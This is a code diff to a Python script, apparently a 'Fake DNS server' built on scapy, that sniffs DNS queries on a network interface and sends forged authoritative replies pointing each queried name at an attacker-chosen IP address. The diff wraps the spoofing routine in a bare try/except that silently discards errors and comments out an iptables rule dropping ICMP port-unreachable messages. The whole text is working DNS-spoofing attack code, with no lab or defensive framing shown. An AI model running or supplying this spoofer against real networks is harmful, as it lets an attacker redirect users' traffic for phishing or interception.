@@ -5,17 +5,20 @@ from scapy.all import *
 import subprocess
 
 def dns_spoof(pkt, target_ip):
-    payload = pkt[Raw].load
-    dns = DNS(payload)
-    if DNSQR in dns and dns.opcode == 0:
-        spoofed_pkt = IP(id=1, dst=pkt[IP].src, src=pkt[IP].dst)/\
-             UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
-             DNS(id=dns.id, qd=dns.qd, aa=1, qr=1, an=DNSRR(rrname=dns[DNSQR].qname, ttl=64, rdata=target_ip))
-        spoofed_pkt.chksum = None  
-        spoofed_pkt = spoofed_pkt.__class__(bytes(spoofed_pkt))
-        send(spoofed_pkt, verbose=0)  
-        #spoofed_pkt.show()
-        print("DNS packet intercepted and false response sent")
+    try:
+        payload = pkt[Raw].load
+        dns = DNS(payload)
+        if DNSQR in dns and dns.opcode == 0:
+            spoofed_pkt = IP(id=1, dst=pkt[IP].src, src=pkt[IP].dst)/\
+                UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
+                DNS(id=dns.id, qd=dns.qd, aa=1, qr=1, an=DNSRR(rrname=dns[DNSQR].qname, ttl=64, rdata=target_ip))
+            spoofed_pkt.chksum = None  
+            spoofed_pkt = spoofed_pkt.__class__(bytes(spoofed_pkt))
+            send(spoofed_pkt, verbose=0)  
+            #spoofed_pkt.show()
+            print("DNS packet intercepted and false response sent")
+    except:
+        pass
 
 def main():
     parser = argparse.ArgumentParser(description="Fake DNS server")
@@ -34,8 +37,8 @@ def main():
             "udp[10] & 0x80 = 0",                   # DNS queries only
             ])
 
-    command = ["iptables", "-I", "OUTPUT", "-p", "icmp", "--icmp-type", "port-unreachable", "-j", "DROP"]
-    subprocess.run(command, check=True)
+    #command = ["iptables", "-I", "OUTPUT", "-p", "icmp", "--icmp-type", "port-unreachable", "-j", "DROP"]
+    #subprocess.run(command, check=True)
     sniff(filter=packet_filter, prn=lambda pkt: dns_spoof(pkt, args.target_ip), iface="eth0")
 
 if __name__ == "__main__":
